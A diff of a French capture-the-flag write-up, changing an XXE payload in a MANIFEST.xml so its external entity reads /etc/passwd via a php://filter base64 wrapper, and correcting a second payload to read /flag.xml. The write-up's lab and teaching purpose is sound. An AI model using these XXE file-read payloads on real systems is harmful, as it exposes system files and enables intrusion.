@@ -65,7 +65,7 @@ Voici le MANIFEST.xml avec la XXE :
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE entreprise [  
 <!ELEMENT entreprise ANY >
-<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/willywonka/tickets/pramafil/MANIFEST.xml">
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
 <root>
 	<entreprise>&xxe;</entreprise>
@@ -123,7 +123,7 @@ On va donc lire le fichier /flag.txt
 
 Payload : 
 
-`php://filter/convert.base64-encode/resource=/flag..xml`
+`php://filter/convert.base64-encode/resource=/flag.xml`
 
 C'est immédiat :
 
